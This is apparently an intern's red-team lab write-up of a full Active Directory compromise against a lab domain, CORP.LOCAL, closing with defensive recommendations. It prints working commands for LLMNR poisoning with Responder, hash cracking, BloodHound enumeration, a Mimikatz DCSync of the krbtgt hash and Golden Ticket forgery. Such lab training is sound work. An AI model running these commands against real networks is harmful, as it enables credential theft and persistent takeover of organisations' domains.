# 👑 Week 08 — AD Domain Dominance

**Intern:** Ali Ahsan | **Roll No:** CSI-B1-427
**Program:** Cyberstar Cybersecurity Red Teaming Internship
**Instructor:** Umar Niaz
**Date:** 27 April 2026
**Target Domain:** CORP.LOCAL

---

## 📌 Overview

This week simulated a **full-scope Active Directory red team engagement** — from zero domain privileges to complete Domain Controller compromise and persistent access, using only protocol weaknesses and misconfigured permissions (no zero-days required).

---

## ⚔️ Attack Chain Overview

| Phase | Technique | Tool | Result |
|-------|-----------|------|--------|
| 01 | LLMNR/NBT-NS Poisoning | Responder | NTLMv2 Hash Captured |
| 02 | Hash Cracking | Hashcat (-m 5600) | Plaintext: Password123 |
| 03 | AD Enumeration | SharpHound + BloodHound | Attack Path Identified |
| 04 | DCSync Attack | Mimikatz | KRBTGT Hash Extracted |
| 05 | Golden Ticket Forgery | Mimikatz kerberos::golden | 10-Year TGT Forged |
| 06 | Domain Access | Pass-the-Ticket | DC C$ Accessed |

**Result: Full Domain Compromise** — all credential hashes extracted, persistent access established.

---

## 🧪 Tasks Covered

### Task 01 — LLMNR/NBT-NS Poisoning

```bash
sudo responder -I eth0 -dwv
```
Triggered broadcast by entering `\\fake-share` on the victim machine → NTLMv2 hash captured from `CORP\Administrator`.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
# Result: Password123
```

### Task 02 — BloodHound Enumeration & ACL Analysis

```bash
.\SharpHound.exe -c All --outputdirectory C:\Users\Administrator\Desktop\
```
BloodHound Cypher query revealed attack path from `TESTUSER@CORP.LOCAL` → `DOMAIN ADMINS@CORP.LOCAL` through standard AD group memberships — no exploit required.

### Task 03 — DCSync Attack

```bash
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

| Account | RID | Significance |
|---------|-----|-------------|
| krbtgt | 502 | Kerberos TGT Signing Key — CRITICAL |
| Administrator | 500 | Domain Admin Account |

### Task 04 — Golden Ticket Forgery

```bash
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /user:Administrator /id:500 /ptt
```

- **Validity:** 10 years
- **Survives:** Password resets (until KRBTGT rotated twice)
- **Injection:** Pass-the-Ticket (lives in memory, no files on disk)

**Verified domain access:**
```bash
dir \\WIN-IJKFNC106CM\c$   # DC administrative share — confirmed ✅
```

---

## 🔑 Why Golden Ticket = "God Mode"

The DC validates TGTs using only the KRBTGT hash — it has no record of which tickets it issued. A forged ticket is **indistinguishable from a legitimate one**. Even changing the Administrator password does not invalidate it. The only fix is rotating the KRBTGT password **twice**.

---

## 🛡️ Security Recommendations

- **Disable LLMNR and NBT-NS** via Group Policy immediately
- **Rotate KRBTGT password twice** (use New-KrbtgtKeys.ps1, wait 10h between rotations)
- **Implement Tiered Administration** — Domain Admin accounts never on workstations
- **Audit ACLs with BloodHound** quarterly as a Blue Team control
- **Restrict DCSync rights** to DC computer accounts only

---

## 🛠️ Tools Used

`Responder` · `Hashcat` · `BloodHound` · `SharpHound` · `Mimikatz` · `Impacket`

---

## ⚠️ Disclaimer

> Performed in an **authorized lab environment** against a controlled Windows domain. For educational purposes only.
